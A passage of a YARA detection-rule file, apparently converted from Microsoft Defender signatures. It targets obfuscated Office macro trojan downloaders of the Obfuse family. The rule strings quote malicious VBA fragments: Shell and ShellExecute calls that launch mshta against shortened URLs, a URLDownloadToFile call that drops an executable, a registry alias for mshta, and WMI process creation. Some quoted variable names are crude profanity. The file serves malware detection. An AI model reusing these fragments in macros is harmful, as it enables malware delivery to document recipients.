        $x_1_3 = "c.Add \"bitly.com/asdasdasdqwfefwef\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_29
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"ps://%40%40@j.mp/a7s8dasgdhsasadfxc\"" ascii //weight: 1
        $x_2_2 = "CreateObject(hireme).Exec suckmydickfornoreason10 + suckmydickfornoreason11" ascii //weight: 2
        $x_1_3 = "= \"p://%20%20@j.mp/asasdaxasxdasasddkaos\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_30
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= WshShell.Exec(calcsexkookk)" ascii //weight: 1
        $x_1_2 = "= \"tp://%898923849%898923849@j.mp/\"" ascii //weight: 1
        $x_1_3 = "= calcsecyko9_12 + calcsecyko9_42_as + k9_42_as" ascii //weight: 1
        $x_1_4 = "= calcsexko + calcsecykoo0_SD_12 + ping_1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_31
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print (VBA.Shell(lICaeuhsL + JNP7RMHgm + thVrr3JP8 + CsYR5e2Lq))" ascii //weight: 1
        $x_1_2 = "If StrReverse(\"IOQdQybvczn\") = StrReverse(\"qTTCquoeuY\") Then End" ascii //weight: 1
        $x_1_3 = "CsYR5e2Lq = \"ccomplermxjdajse\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_32
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= \"/%909123id%909123id%909123id%909123id%909123id@j.mp\\das2fdasdxzczc\"" ascii //weight: 2
        $x_2_2 = "= \"/%909123id%909123id%909123id%909123id%909123id@j.mp\\das657xzcghzghas\"" ascii //weight: 2
        $x_1_3 = "Shell tomala + kokdasodk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_33
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 22 [0-12] 22 2c 20 22 [0-12] 22 2c 20 22 6c 79 2f 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"ta\" + \" h\" + String(2, \"t\") + \"p://\" + String(1, \"b\") + \"it.\" +" ascii //weight: 1
        $x_1_3 = "= \"m\" + String(1, \"s\") + String(1, \"h\") +" ascii //weight: 1
        $x_1_4 = "Shell (ComingtoAmerica)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_34
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "xxx = PDF1 + PDF2 + PDF3" ascii //weight: 1
        $x_1_2 = "= CreateObject(magoog + magoog1)" ascii //weight: 1
        $x_1_3 = {26 20 22 70 73 3a 2f 2f 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 22 20 26 20 22 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 22 20 26 20 22 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 25 36 39 22 20 26 20 [0-8] 20 2b 20 [0-8] 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 2f 22 29 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_35
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell lodhi + \" http://12384928198391823%12384928198391823@j.mp/\" + \"fvgjadagj\" + \"dbgvahsksadgka" ascii //weight: 1
        $x_1_2 = "Shell \"ping 127.0.0.1\": Shell \"calc" ascii //weight: 1
        $x_1_3 = "= (ActivePresentation.Path & \"\\test.xlsx\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_36
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 45 78 65 63 75 74 65 40 20 5f 0d 0a 4e 61 6d 61 6b 42 6f 72 61 20 5f 0d 0a 2c 20 5f 0d 0a 6c 6f 72 61 32}  //weight: 1, accuracy: High
        $x_1_3 = "\"https://www.bitly.com/asahdjiaiaaarqawn" ascii //weight: 1
        $x_1_4 = "\"https://www.bitly.com/asahdjiaiaawn" ascii //weight: 1
        $x_1_5 = "\"https://www.bitly.com/asahdjiaiwn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_37
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"tps://www.diamantesviagens.com.br/sexta.\"" ascii //weight: 1
        $x_1_2 = "= \"hta\"" ascii //weight: 1
        $x_1_3 = {4d 5f 53 4f 69 4d 20 3d 20 [0-8] 47 4b 4a 48 67 6b 68 67 4b 48 4a 47 6b 4f 69 4d [0-11] 20 2b 20 [0-8] 47 4b 4a 48 67 6b 68 67 4b 48 4a 47 6b 4f 69 4d 5f 31 [0-8] 20 2b 20 [0-8] 47 4b 4a 48 67 6b 68 67 4b 48 4a 47 6b 4f 69 4d 5f 32 [0-12] 20 2b 20 [0-8] 47 4b 4a 48 67 6b 68 67 4b 48 4a 47 6b 4f 69 4d 5f 33}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 28 [0-8] 4d 5f 53 4f 69 4d 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_38
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URLDownloadToFile 0, ImagemSimplesCDT, MasterCDT & \"document.exe\", 0, 0" ascii //weight: 1
        $x_1_2 = "Shell (M_S + TOGACDT + M_S1 + M_S2 + M_S3)" ascii //weight: 1
        $x_1_3 = "MasterCDT = \"C:\\Users\\Public\\\"" ascii //weight: 1
        $x_1_4 = "= \"> nul & start C\"" ascii //weight: 1
        $x_1_5 = "PDf_2 = \"exe\"\" /c pi\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_39
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"ping.exe\"" ascii //weight: 1
        $x_1_2 = "= Shell(potaka + pogatalove1, vbMinimizedFocus)" ascii //weight: 1
        $x_1_3 = "=\"/%909123id%909123id%909123id%909123id%909123id%909123id%909123id%909123id%909123id%909123id%909123id@j.mp\\dabsghkdta7sdtasgvnqb23v\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_40
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sheet2.microsoft.ShellExecute Sheet3.lol, Sheet1.hahaha" ascii //weight: 1
        $x_1_2 = "= \"mshta\"" ascii //weight: 1
        $x_1_3 = "= \"https://www.bitly.com/asdasdasdfwffdwkdaw\"" ascii //weight: 1
        $x_1_4 = "= \"https://www.bitly.com/asddwdwkdadlwpw\"" ascii //weight: 1
        $x_1_5 = "= \"https://www.bitly.com/asdiasddwkokoaasdskdaw\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_41
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= okod_xwkokasd_Wdo + aSDKK_dmwo + kok_daksdo + askdo_Wxmo + ko_dwko" ascii //weight: 1
        $x_1_2 = "= lolo + koko + plpl + plwo + ladpso + huppp + kokowok + koldic + puto + koliclc + koliclc" ascii //weight: 1
        $x_1_3 = "CreateObject(ali).EXEC lll + lo0ol" ascii //weight: 1
        $x_1_4 = "AUto_ClOsE()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_42
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 5f 0d 0a 20 20 28 30 2c 20 22 6f 70 65 6e 22 2c 20 6b 6f 6b 6f 2c 20 22 68 22 20 5f}  //weight: 1, accuracy: High
        $x_1_2 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 5f 0d 0a 4c 69 62 20 5f 0d 0a 22 53 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 5f 0d 0a 41 6c 69 61 73 20 5f 0d 0a 22 53 68 65 6c 6c 45 78 65 63 75 74 65 41 22 20 5f}  //weight: 1, accuracy: High
        $x_1_3 = "SW_SHOWMinimize)" ascii //weight: 1
        $x_1_4 = "\"%public%\" _" ascii //weight: 1
        $x_1_5 = {6b 6f 6b 6f 20 5f 0d 0a 3d 20 5f 0d 0a 22 6d 22 20 5f 0d 0a 2b 20 5f 0d 0a 22 73 22 20 5f 0d 0a 2b 20 5f 0d 0a 22 68 22 20 5f 0d 0a 2b 20 5f 0d 0a 22 74 22 20 5f 0d 0a 2b 20 5f 0d 0a 22 61 22 0d 0a 45 6e 64 20 5f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_43
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Wscript.Shell\").regwrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\sex.exe\\\", \"M\" + \"s\" + \"h\" + \"t\" + \"a\", \"REG_SZ\"" ascii //weight: 1
        $x_1_2 = "CreateObject(\"Wscript.Shell\").Run \"sex https:\\\\%20%20@j.mp\\ddddjxdsadasdasidjaisd\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_44
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= \"/%909123id%909123id%909123id%909123id%909123id%909123id@j.mp\\dasdashdsa7ydsagdha\"" ascii //weight: 2
        $x_2_2 = "= \"/%909123id%909123id%909123id%909123id%909123id%909123id@j.mp\\dasd67asehj23enasdZ\"" ascii //weight: 2
        $x_2_3 = "= \"/%909123id%909123id%909123id%909123id%909123id%909123id@j.mp\\s6a7saghgahs2sdxz\"" ascii //weight: 2
        $x_1_4 = "Shell \"ping.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_45
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"p://%40%40%40%40%40%40%40%40%40%40%40%40@j.m\"" ascii //weight: 1
        $x_3_2 = "= pubitity6 + pubitity7 + pubitity8 + pubitity9 + \"p/bhasd6723hjasvdbnczvxcnb\"" ascii //weight: 3
        $x_3_3 = "= pubitity6 + pubitity7 + pubitity8 + pubitity9 + \"p/bcksagdagsdavdbnzxcvagfha\"" ascii //weight: 3
        $x_3_4 = "= pubitity6 + pubitity7 + pubitity8 + pubitity9 + \"p/gbksad6732hjgbczvnzbxc\"" ascii //weight: 3
        $x_1_5 = "CreateObject(fuckzargus).Exec resonswhy10 + resonswhy11" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_46
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"p://%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40@j.m\"" ascii //weight: 1
        $x_1_2 = "CreateObject(fuckzargus).Exec resonswhy10 + resonswhy111" ascii //weight: 1
        $x_3_3 = "= pubitity61 + pubitity71 + pubitity81 + pubitity91 + \"p/gdksad79823ekalhdkjbzxc\"" ascii //weight: 3
        $x_3_4 = "= pubitity61 + pubitity71 + pubitity81 + pubitity91 + \"p/dashkd67ae2hg3ejavxczmxc\"" ascii //weight: 3
        $x_3_5 = "= pubitity61 + pubitity71 + pubitity81 + pubitity91 + \"p/d1a2s3dasdhgkajdt3e2ghjkasd\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_47
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"ping.exe\"" ascii //weight: 1
        $x_1_2 = "= Shell(mylover + parker, vbMinimizedFocus)" ascii //weight: 1
        $x_3_3 = "= \"/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\\798234ghsdbnvzhgdfysABMZJ\"" ascii //weight: 3
        $x_3_4 = "= \"/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\\ahjdhaksdasdbhkasgdjh\"" ascii //weight: 3
        $x_3_5 = "= \"/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\\advsbdashdfjashdlamnxzbvnabfsd\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_48
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/ajdwwaskdorufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_2 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/ajdwwdwdwdmlrufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_3 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/ajdwwdwdrufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_4 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/wdowdpkdowdwpufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_5 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/wdowdpowdlwdprufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_6 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/wddwdwodkpdlwufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_7 = "MsgBox \"Error!!\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DD_2147752010_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DD!MTB"
        threat_id = "2147752010"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dimv,_r,appdataenc=strreverse(enc)" ascii //weight: 1
        $x_1_2 = {66 6f 72 72 3d 31 74 6f 6c 65 6e 28 65 6e 63 29 76 3d 6d 69 64 28 65 6e 63 2c 72 2c 31 29 61 70 70 64 61 74 61 3d 61 70 70 64 61 74 61 26 63 68 72 28 61 73 63 28 76 29 2d 31 29 6e 65 78 74 [0-12] 3d 61 70 70 64 61 74 61 65 6e 64 66 75 6e 63 74 69 6f 6e 66 75 6e 63 74 69 6f 6e [0-31] 28 29 01 28 30 29 3d 32 33 33}  //weight: 1, accuracy: Low
        $x_1_3 = {2c 30 2c 30 65 73 7a 72 30 2c 22 6f 70 65 6e 22 2c [0-90] 2c 22 22 2c 76 62 6e 75 6c 6c 73 74 72 69 6e 67 2c 76 62 6e 6f 72 6d 61 6c 66 6f 63 75 73 65 6e 64 73 75 62 66 75 6e 63 74 69 6f 6e [0-15] 28 29 61 73 64 6f 75 62 6c 65 63 61 6c 6c [0-32] 65 6e 64 66 75 6e 63 74 69 6f 6e 73 75 62 77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 [0-15] 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {28 22 66 79 66 2f 73 73 6a 6a 22 29 [0-90] 3d 65 6e 76 69 72 6f 6e 24 28 22 61 70 70 64 61 74 61 22 29 26 22 5c 22 26}  //weight: 1, accuracy: Low
        $x_1_5 = {28 22 66 79 66 2f [0-31] 30 6e 70 64 2f 68 6f 6a 6d 73 76 69 2e 74 6b 2f 78 78 78 30 30 3b 74 71 75 75 69 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PG_2147752333_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PG!MTB"
        threat_id = "2147752333"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "hjKlShlStqBLoYKnLfqJcNqUJYZultgW" ascii //weight: 1
        $x_1_2 = "GetObject(\"WiNmGmTs:{ImPeRsOnAtIoNlEvEl=ImPeRsOnAtE}!\\\\.\\RoOt\\CiMv2" ascii //weight: 1
        $x_1_3 = ".Get(\"wIn32_pRoCeSs" ascii //weight: 1
        $x_1_4 = {22 20 68 22 20 2b 20 22 74 22 20 2b 20 22 74 22 [0-20] 22 3a 22 20 2b 20 22 2f 22 20 2b 20 22 2f 22 20 2b 20 22 67 22 20 2b 20 22 72 22 20 2b 20 22 6f 22 20 2b 20 22 75 22 20 2b 20 22 70 22 20 2b 20 22 73 22 20 2b 20 22 2e 22 20 2b 20 22 75 22 20 2b 20 22 73 22 20 2b 20 22 2e 22 20 2b 20 22 74 22 20 2b 20 22 6f 22 20 2b 20 22 3a 22 20 2b 20 22 36 22 20 2b 20 22 39 22 20 2b 20 22 2f 22 20 2b 20 22 30 22 20 2b 20 22 33 22 20 2b 20 22 2e 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "\"m\" + \"S\" + \"h\" + \"T\" + \"a\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DL_2147752431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DL!MTB"
        threat_id = "2147752431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "30.3.11.23.20.9.30.9" ascii //weight: 1
        $x_1_2 = "Shell al8ib & \" \" & ank9A" ascii //weight: 1
        $x_1_3 = "Shell a2ES6G & \" \" & agrX3B" ascii //weight: 1
        $x_1_4 = "Trim(aAPZBo Xor aUIz4k)" ascii //weight: 1
        $x_1_5 = "Trim(afD27E Xor aex3vF)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PJ_2147752465_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PJ!MTB"
        threat_id = "2147752465"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
